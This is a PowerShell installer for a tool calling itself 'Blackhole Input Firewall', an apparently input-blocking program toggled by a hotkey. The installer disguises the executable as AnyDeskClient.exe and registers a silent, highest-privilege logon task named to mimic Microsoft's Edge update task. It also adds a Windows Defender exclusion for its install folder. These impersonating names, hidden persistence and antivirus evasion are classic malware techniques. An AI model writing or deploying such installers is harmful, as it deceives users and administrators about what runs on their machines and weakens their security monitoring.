# ============================================================================
# Blackhole Input Firewall - Installation Script (PowerShell)
# Installs the service to auto-start on Windows boot via Task Scheduler
# ============================================================================

param(
    [switch]$Dev
)

# Require administrator privileges
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "ERROR: This script must be run as Administrator."
    Write-Host "Please right-click and select 'Run as Administrator'."
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit 1
}

# Configuration variables
$ExeName = "AnyDeskClient.exe"
$ProcessName = "AnyDeskClient"
$InstallDir = "$env:ProgramData\AnyDeskClient"
$TaskName = "MicrosoftEdgeUpdateTaskMachineCore"

Write-Host ""
Write-Host "========================================"
Write-Host "  Task Host Service - Install"
Write-Host "========================================"
Write-Host ""

# Check if executable exists
$distExePath = "dist\$ExeName"
if (-not (Test-Path $distExePath)) {
    Write-Host "ERROR: $ExeName not found in dist\ directory."
    Write-Host "Please run build.ps1 first to create the executable."
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit 1
}

# Define installation paths
$ExePath = "$InstallDir\$ExeName"

Write-Host "[1/6] Creating installation directory"
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}
Write-Host "  - Directory: $InstallDir"
Write-Host ""

Write-Host "[2/6] Creating data directory"
$DataDir = Join-Path $InstallDir "data"
if (-not (Test-Path $DataDir)) {
    New-Item -ItemType Directory -Path $DataDir -Force | Out-Null
    Write-Host "  - Data directory: $DataDir"
} else {
    Write-Host "  - Data directory already exists"
}
Write-Host ""

Write-Host "[3/6] Copying executable"
Copy-Item $distExePath $ExePath -Force
if (-not (Test-Path $ExePath)) {
    Write-Host "ERROR: Failed to copy executable."
    Read-Host "Press Enter to exit"
    exit 1
}
Write-Host "  - Copied: $ExeName"
Write-Host ""

# Handle .dev_mode marker
if ($Dev) {
    Write-Host "[4/6] Copying .dev_mode marker (DEV MODE)"
    
    # Check if .dev_mode exists in dist folder (from build)
    if (Test-Path "dist\.dev_mode") {
        Copy-Item "dist\.dev_mode" "$InstallDir\.dev_mode" -Force
        Write-Host "  - Copied: .dev_mode marker from dist folder"
    } else {
        # Create it if it doesn't exist (fallback)
        New-Item -ItemType File -Path "$InstallDir\.dev_mode" -Force | Out-Null
        Write-Host "  - Created: .dev_mode marker (fallback)"
    }
    
    Write-Host "  - Console window will be VISIBLE"
    Write-Host ""
} else {
    Write-Host "[4/6] Removing .dev_mode marker (PRODUCTION MODE)"
    
    # Delete marker from install dir if it exists
    if (Test-Path "$InstallDir\.dev_mode") {
        Remove-Item "$InstallDir\.dev_mode" -Force
        Write-Host "  - Removed: .dev_mode marker from install directory"
    }
    
    # Also clean up dist folder if it exists
    if (Test-Path "dist\.dev_mode") {
        Remove-Item "dist\.dev_mode" -Force
        Write-Host "  - Removed: .dev_mode marker from dist folder"
    }
    
    Write-Host "  - Service will run SILENTLY in background"
    Write-Host ""
}

Write-Host "[5/6] Creating Task Scheduler service"

# Delete existing task if it exists
$existingTask = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
if ($existingTask) {
    Write-Host "  - Removing existing task"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
}

# Create new task
$action = New-ScheduledTaskAction -Execute $ExePath
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

if (-not (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue)) {
    Write-Host "ERROR: Failed to create Task Scheduler entry."
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "  - Task created: $TaskName"
Write-Host "  - Trigger: At user logon"
Write-Host "  - User: $env:USERNAME"
Write-Host ""

Write-Host "Starting service"
Start-ScheduledTask -TaskName $TaskName
Start-Sleep -Seconds 2

$task = Get-ScheduledTask -TaskName $TaskName
if ($task.State -eq "Running") {
    Write-Host "  - Service started successfully"
} else {
    Write-Host "  - Warning: Service scheduled but not running yet"
    Write-Host "  - Service will start on next system boot"
}
Write-Host ""

Write-Host "[6/6] Configuring Windows Defender exclusion"
try {
    # Check if Defender module is available
    $defenderModule = Get-Module -ListAvailable -Name Defender
    if ($defenderModule -or (Get-Command Add-MpPreference -ErrorAction SilentlyContinue)) {
        # Check if exclusion already exists
        try {
            $existingExclusions = Get-MpPreference -ErrorAction Stop | Select-Object -ExpandProperty ExclusionPath
            if ($existingExclusions -notcontains $InstallDir) {
                Add-MpPreference -ExclusionPath $InstallDir -ErrorAction Stop
                Write-Host "  - Added folder exclusion: $InstallDir"
            } else {
                Write-Host "  - Folder exclusion already exists: $InstallDir"
            }
        } catch {
            Write-Host "  - ERROR: Failed to check/add exclusion" -ForegroundColor Red
            Write-Host "  - Error Type: $($_.Exception.GetType().FullName)" -ForegroundColor Yellow
            Write-Host "  - Error Message: $($_.Exception.Message)" -ForegroundColor Yellow
            if ($_.Exception.InnerException) {
                Write-Host "  - Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Yellow
            }
            throw  # Re-throw to be caught by outer catch
        }
    } else {
        Write-Host "  - Windows Defender module not available (skipping exclusion)"
    }
} catch {
    Write-Host "  - ERROR: Failed to configure Defender exclusion" -ForegroundColor Red
    Write-Host "  - Error Type: $($_.Exception.GetType().FullName)" -ForegroundColor Yellow
    Write-Host "  - Error Message: $($_.Exception.Message)" -ForegroundColor Yellow
    if ($_.Exception.InnerException) {
        Write-Host "  - Inner Exception: $($_.Exception.InnerException.Message)" -ForegroundColor Yellow
    }
    Write-Host "  - You may need to add the exclusion manually in Windows Security settings" -ForegroundColor Yellow
}
Write-Host ""

Write-Host "========================================"
Write-Host "  Installation Complete!"
Write-Host "========================================"
Write-Host ""
if ($Dev) {
    Write-Host "Mode: DEV (console visible)"
} else {
    Write-Host "Mode: PRODUCTION (silent background service)"
}
Write-Host ""
Write-Host "Service: $TaskName"
Write-Host "Location: $ExePath"
Write-Host "Hotkey: Win+Shift+F (toggle firewall)"
Write-Host ""
Write-Host "To uninstall: .\uninstall.ps1"
Write-Host ""

Read-Host "Press Enter to exit"

